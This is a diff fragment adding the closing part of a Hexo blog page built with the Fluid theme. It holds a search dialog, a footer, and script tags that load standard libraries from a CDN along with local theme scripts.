+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
